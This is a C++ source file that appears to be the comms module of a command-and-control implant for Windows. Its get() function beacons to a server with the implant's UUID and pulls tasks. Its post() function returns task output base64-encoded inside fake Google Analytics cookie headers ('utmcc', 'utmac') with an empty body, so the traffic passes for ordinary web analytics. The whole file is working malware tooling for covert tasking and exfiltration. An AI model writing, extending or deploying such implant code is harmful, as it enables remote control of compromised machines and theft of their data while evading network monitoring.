#include <vector>
#include <iostream>
#include "../protocols/http_wininet/http.h"
#include "../data/transforms/transforms.h"
#include "../data/msgpack/msgpack.h"

//Comms file, this is where the comms/transform calls, etc go
// 
nlohmann::json get(std::string implant_uuid) {
    //note, pass a copy of implant_uuid in, as we are going to be potentialyl heavily editing it. 

    //std::vector<uint8_t> http_response_buffer;

    std::string http_response_buffer;


    //[TEMPLATE ME] //temp use of headers, matching test mc2 profile. 
    // Define headers (No \r\n needed)

    //create metadata
    std::map<std::string, std::string> metadata;
    metadata["implant_uuid"] = implant_uuid;

    std::vector<uint8_t> metadata_as_msgpack;
    create_metadata(metadata, metadata_as_msgpack);

    //hold bytes in string, as all the transforsm want a string
    std::string payload(metadata_as_msgpack.begin(), metadata_as_msgpack.end());

    /*
    TEMPLATE_BEGIN
    */

    //bsae64 encode the implant_uuid
    base64_encode_inplace(payload); //this should be metadata buffer

    //add into header
    std::vector<std::wstring> headers = {
    L"utmcc: " + std::wstring(payload.begin(), payload.end())
    };



    if (HTTP_GET(headers, http_response_buffer)) {
        // Check if buffer is empty before decoding
        if (http_response_buffer.empty()) {
            return nullptr;
        }

        /*
        Transforms....
        */

        std::cout << "Success! Bytes read: " << http_response_buffer.size() << std::endl;
        nlohmann::json task_data = decode_msgpack_task(http_response_buffer);
        return task_data;

    }
    //could also check for 204, maybe do that at the HTTP_GET func level. For now, if no task/no body, it says no task and sleeps
    else {
        
        std::cerr << "Request failed." << std::endl;
        return nullptr;
    }

    /*
    TEMPLATE_END
    */
    return nullptr;
}



int post(std::string implant_uuid, std::string output_data, std::string task_uuid) {
    std::vector<uint8_t> task_response_msgpack;

    //need to turn output data into msgpack
    create_task_response(implant_uuid, task_uuid, output_data, task_response_msgpack);

    //any transformations to data
    //hold bytes in string, as all the transforsm want a string
    std::string payload(task_response_msgpack.begin(), task_response_msgpack.end());
    base64_encode_inplace(payload); //this should be metadata buffer

    //add into header - wstring cuz that's what the winapi uses
    std::vector<std::wstring> headers = {
    L"utmac: " + std::wstring(implant_uuid.begin(), implant_uuid.end()),
    L"utmcc: " + std::wstring(payload.begin(), payload.end())

    };

    //add payload header - wstring cuz that's what the winapi uses
    //std::vector<std::wstring> payload_stored_in_header = {
    //L"utmac: " + std::wstring(payload.begin(), payload.end())
    //};

    //this specific profile, no data in body. It's stored in utmcc
    std::string payload_string = "";

    //send
    std::string http_post_response_buffer;
    if (!HTTP_POST(payload_string, headers, http_post_response_buffer)) {
        std::cout << "Error occured posting data";
    };
    
    return 0;

}


//overload for bytes
//int post(std::vector<uint8_t> output_data)
